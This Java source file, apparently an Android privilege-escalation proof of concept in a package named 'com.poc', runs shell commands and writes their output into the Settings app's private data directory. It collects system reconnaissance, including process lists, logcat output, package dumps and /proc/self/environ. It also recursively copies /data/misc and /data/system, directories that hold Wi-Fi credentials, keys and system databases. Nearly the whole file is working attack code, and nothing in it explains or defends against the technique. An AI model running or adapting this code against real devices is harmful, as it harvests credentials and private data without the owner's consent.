package com.poc;

import java.io.*;
import java.util.*;

public class Main {
    public static void main(String[] args) {
        String targetDir = "/data/data/com.android.settings/";
        File target = new File(targetDir);
        if (!target.exists()) {
            target.mkdirs();
        }
        execTest(targetDir + "exec-test.txt");
        procInfo(targetDir + "proc.txt");
        multiCommandsAndDump(targetDir);
    }

    private static void execCommand(String command, String outputFile) {
        try {
            ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c", command);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile, true));
            writer.write("Command: " + command + "\n");
            writer.write("--- Output ---\n");
            String line;
            while ((line = reader.readLine()) != null) {
                writer.write(line);
                writer.newLine();
            }
            writer.write("--- End ---\n\n");
            writer.close();
            process.waitFor();
        } catch (Exception e) {
        }
    }

    private static void execTest(String outputFile) {
        String[] commands = {
            "id",
            "whoami",
            "pwd",
            "ls -l /",
            "ls -l /data",
            "ls -l /system",
            "ls -l /sdcard",
            "ls -l /storage",
            "ls -l /mnt",
            "ls -lR /data/local/tmp",
            "find /data -type d -maxdepth 2"
        };
        for (String cmd : commands) {
            execCommand(cmd, outputFile);
        }
    }

    private static void procInfo(String outputFile) {
        File attrDir = new File("/proc/self/attr");
        if (attrDir.exists() && attrDir.isDirectory()) {
            File[] files = attrDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    String cmd = "cat " + f.getAbsolutePath();
                    execCommand(cmd, outputFile);
                }
            }
        }
        String[] extra = {
            "cat /proc/self/status",
            "cat /proc/self/environ",
            "cat /proc/self/cmdline",
            "cat /proc/self/maps"
        };
        for (String cmd : extra) {
            execCommand(cmd, outputFile);
        }
    }

    private static void copyDir(File src, File dest) {
        if (src.isDirectory()) {
            if (!dest.exists()) dest.mkdirs();
            File[] children = src.listFiles();
            if (children != null) {
                for (File child : children) {
                    copyDir(child, new File(dest, child.getName()));
                }
            }
        } else {
            try (FileInputStream fis = new FileInputStream(src);
                 FileOutputStream fos = new FileOutputStream(dest)) {
                byte[] buffer = new byte[8192];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    fos.write(buffer, 0, len);
                }
            } catch (Exception e) {
            }
        }
    }

    private static void multiCommandsAndDump(String targetDir) {
        File target = new File(targetDir);
        if (!target.exists()) target.mkdirs();

        File miscSrc = new File("/data/misc");
        File systemSrc = new File("/data/system");
        if (miscSrc.exists()) {
            copyDir(miscSrc, new File(target, "misc"));
        }
        if (systemSrc.exists()) {
            copyDir(systemSrc, new File(target, "system"));
        }

        String outputFile = targetDir + "multi_commands.txt";
        String[] commands = {
            "id",
            "whoami",
            "pwd",
            "ls -l /",
            "ls -l /data",
            "ls -l /system",
            "ls -l /sdcard",
            "ls -l /storage",
            "ls -l /mnt",
            "ps",
            "ps -A",
            "ps -e",
            "top -n 1",
            "df -h",
            "mount",
            "netstat -an",
            "ifconfig",
            "ip addr show",
            "getprop",
            "dumpsys battery",
            "dumpsys meminfo",
            "dumpsys package",
            "pm list packages",
            "pm list permissions",
            "am stack list",
            "am activity list",
            "logcat -d -v time",
            "cat /proc/version",
            "cat /proc/cpuinfo",
            "cat /proc/meminfo",
            "cat /proc/uptime",
            "cat /proc/stat",
            "cat /proc/loadavg",
            "cat /proc/sys/kernel/ostype",
            "cat /proc/sys/kernel/osrelease",
            "cat /proc/sys/kernel/hostname",
            "cat /proc/self/status",
            "cat /proc/self/environ",
            "cat /proc/self/cmdline",
            "cat /proc/self/maps",
            "ls -l /proc/self/fd",
            "ls -l /data/misc",
            "ls -l /data/system",
            "find /data/misc -type f -exec ls -l {} \\; 2>/dev/null",
            "find /data/system -type f -exec ls -l {} \\; 2>/dev/null",
            "echo 'test'",
            "date",
            "uptime",
            "uname -a",
            "cat /proc/interrupts",
            "ls -lR /data/misc 2>/dev/null",
            "ls -lR /data/system 2>/dev/null"
        };
        for (String cmd : commands) {
            execCommand(cmd, outputFile);
        }
    }
}
